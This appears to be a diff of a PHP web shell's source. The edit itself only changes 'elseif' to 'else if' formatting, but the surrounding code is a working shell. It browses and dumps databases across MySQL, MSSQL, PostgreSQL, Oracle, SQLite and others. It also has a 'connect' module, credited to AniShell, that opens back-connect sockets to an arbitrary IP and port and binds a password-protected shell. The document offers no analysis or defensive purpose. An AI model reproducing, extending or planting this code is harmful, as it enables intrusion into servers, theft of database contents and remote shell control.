-			elseif(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($result,1);
-		} elseif($type === 'pgsql') return pg_fetch_row($result);
-		elseif($type === 'oracle') return oci_fetch_row($result);
-		elseif($type === 'sqlite3') return $result->fetchArray(1);
-		elseif($type === 'sqlite') return sqlite_fetch_array($result,1);
-		elseif($type === 'odbc') return odbc_fetch_array($result);
-		elseif($type === 'pdo') return $result->fetch(2);
+			else if(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($result,1);
+		} else if($type === 'pgsql') return pg_fetch_row($result);
+		else if($type === 'oracle') return oci_fetch_row($result);
+		else if($type === 'sqlite3') return $result->fetchArray(1);
+		else if($type === 'sqlite') return sqlite_fetch_array($result,1);
+		else if($type === 'odbc') return odbc_fetch_array($result);
+		else if($type === 'pdo') return $result->fetch(2);
 	}
 
 	function sql_num_rows($type,$result){
 		if ($type === 'mysql'){
 			if(function_exists('mysqli_num_rows')) return mysqli_num_rows($result);
-			elseif(function_exists('mysql_num_rows')) return mysql_num_rows($result);
-		} elseif($type === 'mssql'){
+			else if(function_exists('mysql_num_rows')) return mysql_num_rows($result);
+		} else if($type === 'mssql'){
 			if(function_exists('mssql_num_rows')) return mssql_num_rows($result);
-			elseif(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($result);
-		} elseif($type === 'pgsql') return pg_num_rows($result);
-		elseif($type === 'oracle') return oci_num_rows($result);
-		elseif($type === 'sqlite3'){
+			else if(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($result);
+		} else if($type === 'pgsql') return pg_num_rows($result);
+		else if($type === 'oracle') return oci_num_rows($result);
+		else if($type === 'sqlite3'){
 			$metadata = $result->fetchArray();
 			if(is_array($metadata)) return $metadata['count'];
-		} elseif($type === 'sqlite') return sqlite_num_rows($result);
-		elseif($type === 'odbc') return odbc_num_rows($result);
-		elseif($type === 'pdo') return $result->rowCount();
+		} else if($type === 'sqlite') return sqlite_num_rows($result);
+		else if($type === 'odbc') return odbc_num_rows($result);
+		else if($type === 'pdo') return $result->rowCount();
 	}
 
 	function sql_close($type,$con){
 		if ($type === 'mysql'){
 			if(function_exists('mysqli_close')) return mysqli_close($con);
-			elseif(function_exists('mysql_close')) return mysql_close($con);
-		} elseif($type === 'mssql'){
+			else if(function_exists('mysql_close')) return mysql_close($con);
+		} else if($type === 'mssql'){
 			if(function_exists('mssql_close')) return mssql_close($con);
-			elseif(function_exists('sqlsrv_close')) return sqlsrv_close($con);
-		} elseif($type === 'pgsql') return pg_close($con);
-		elseif($type === 'oracle') return oci_close($con);
-		elseif($type === 'sqlite3') return $con->close();
-		elseif($type === 'sqlite') return sqlite_close($con);
-		elseif($type === 'odbc') return odbc_close($con);
-		elseif($type === 'pdo') return $con = null;
+			else if(function_exists('sqlsrv_close')) return sqlsrv_close($con);
+		} else if($type === 'pgsql') return pg_close($con);
+		else if($type === 'oracle') return oci_close($con);
+		else if($type === 'sqlite3') return $con->close();
+		else if($type === 'sqlite') return sqlite_close($con);
+		else if($type === 'odbc') return odbc_close($con);
+		else if($type === 'pdo') return $con = null;
 	}
 	 
 	/*
@@ -2441,7 +2446,7 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 		}
 		
 		sAjax($sBuff);
-	} elseif (isset($p['host'])){
+	} else if (isset($p['host'])){
 		$con = sql_connect($p['type'], $p['host'], $p['user'], $p['pass']);
 		if ($con !== false){
 			$sBuff .= '<form>' .
@@ -2456,9 +2461,9 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 				
 			if (($p['type']!=='pdo') && ($p['type']!=='odbc')){
 				if ($p['type']==='mssql') $showdb = 'SELECT name FROM master..sysdatabases';
-				elseif ($p['type']==='pgsql') $showdb = 'SELECT schema_name FROM information_schema.schemata';
-				elseif ($p['type']==='oracle') $showdb = 'SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME';
-				elseif ($p['type']==='sqlite' || $p['type']==='sqlite3') $showdb = "SELECT '{$p['host']}'";
+				else if ($p['type']==='pgsql') $showdb = 'SELECT schema_name FROM information_schema.schemata';
+				else if ($p['type']==='oracle') $showdb = 'SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME';
+				else if ($p['type']==='sqlite' || $p['type']==='sqlite3') $showdb = "SELECT '{$p['host']}'";
 				else $showdb = 'SHOW DATABASES'; //mysql
 
 				$res = sql_query($p['type'], $showdb, $con);
@@ -2469,9 +2474,9 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 							$sBuff .= '<p class="touch notif ' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '" onclick=\'toggle("db_'.$rows.'")\'>'.$rows.'</p><div class="uiinfo" id="db_'.$rows.'"><table>';
 
 							if($p['type']==='mssql') $showtbl = "SELECT name FROM {$rows}..sysobjects WHERE xtype = 'U'";
-							elseif($p['type']==='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='{$rows}'";
-							elseif($p['type']==='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='{$rows}'";
-							elseif($p['type']==='sqlite' || $p['type']==='sqlite3') $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
+							else if($p['type']==='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='{$rows}'";
+							else if($p['type']==='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='{$rows}'";
+							else if($p['type']==='sqlite' || $p['type']==='sqlite3') $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
 							else $showtbl = "SHOW TABLES FROM {$rows}"; //mysql
 
 							$res_t = sql_query($p['type'], $showtbl, $con);
@@ -2479,9 +2484,9 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 								while($tablearr = sql_fetch_data($p['type'], $res_t)){
 									foreach($tablearr as $tables){
 										if ($p['type']==='mssql') $dumptbl = "SELECT TOP 100 * FROM {$rows}..{$tables}"; //TODO
-										elseif ($p['type']==='pgsql') $dumptbl = "SELECT * FROM {$rows}.{$tables} LIMIT {limit} OFFSET {start}";
-										elseif ($p['type']==='oracle') $dumptbl = "SELECT * FROM {$rows}.{$tables} WHERE ROWNUM BETWEEN {start} AND (oraclelimit);";
-										elseif ($p['type']==='sqlite' || $p['type']==='sqlite3') $dumptbl = "SELECT * FROM {$tables} LIMIT {start}, {limit}";
+										else if ($p['type']==='pgsql') $dumptbl = "SELECT * FROM {$rows}.{$tables} LIMIT {limit} OFFSET {start}";
+										else if ($p['type']==='oracle') $dumptbl = "SELECT * FROM {$rows}.{$tables} WHERE ROWNUM BETWEEN {start} AND (oraclelimit);";
+										else if ($p['type']==='sqlite' || $p['type']==='sqlite3') $dumptbl = "SELECT * FROM {$tables} LIMIT {start}, {limit}";
 										else $dumptbl = "SELECT * FROM {$rows}.{$tables} LIMIT {start}, {limit}"; //mysql
 											
 										$sBuff .= '<tr><td><a href="#" onclick="dbexec(\'' . $dumptbl . '\');return false;">' . $tables . '</a></td></tr>';
@@ -2540,7 +2545,7 @@ if (isset($p['me']) && $p['me'] === 'connect'){ //Basada en AniShell
 		$sockfd = fsockopen($ip, $port, $errno, $errstr);
 		if ($errno != 0){
 			$sBuff .= "<font color='red'><b>$errno</b>: $errstr</font>";
-		} elseif (!$sockfd){
+		} else if (!$sockfd){
 			$result = '<p>Fatal: An unexpected error was occured when trying to connect!</p>';
 		} else {
 			$len = 1500;
@@ -2555,7 +2560,7 @@ if (isset($p['me']) && $p['me'] === 'connect'){ //Basada en AniShell
 			}
 			fclose($sockfd);
 		}
-	} elseif (@(sValid($p['port'])) && (sValid($p['passwd'])) && (sValid($p['mode']))){
+	} else if (@(sValid($p['port'])) && (sValid($p['passwd'])) && (sValid($p['mode']))){
 			$address = '127.0.0.1';
 			$port = $p['port'];
 			$pass = $p['passwd'];
@@ -2586,7 +2591,7 @@ if (isset($p['me']) && $p['me'] === 'connect'){ //Basada en AniShell
 					$sBuff .= "<br/><br/>\n<b>Task List :-</b> <pre>\n$list</pre>";
 				}
 			}
-	} elseif (@$p['mode'] === 'PHP'){
+	} else if (@$p['mode'] === 'PHP'){
 		if (function_exists("socket_create")){
 			$sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);// Create a TCP Stream socket
 			if (socket_bind($sockfd, $address, $port) == false)
